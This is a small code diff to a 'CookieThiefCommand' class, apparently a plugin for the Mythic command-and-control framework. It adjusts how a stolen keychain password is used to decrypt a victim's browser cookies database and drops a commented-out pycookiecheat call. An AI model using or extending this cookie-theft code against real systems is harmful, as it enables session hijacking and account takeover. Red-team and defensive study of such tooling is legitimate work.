@@ -145,10 +145,10 @@ class CookieThiefCommand(CommandBase):
             print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
             sys.stdout.flush()
 
-        cookie_args = {"cookies_file":"tmp_Cookies", "key":ccs_password, "output": "cookies.json"}
+        cookie_args = {"cookies_file":"/Mythic/mythic/tmp_Cookies", "key":ccs_password, "output":"cookies.json"}
+
         ## Decrypt Cookies file
         try:
-            #subprocess.run(["python3", "/Mythic/mythic/pycookiecheat/pycookiecheat.py", "--cookies-file tmp_Cookies", "--key " + ccs_password, "--output cookies.json"])
             crisp(cookie_args)
             await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
         except Exception as e:
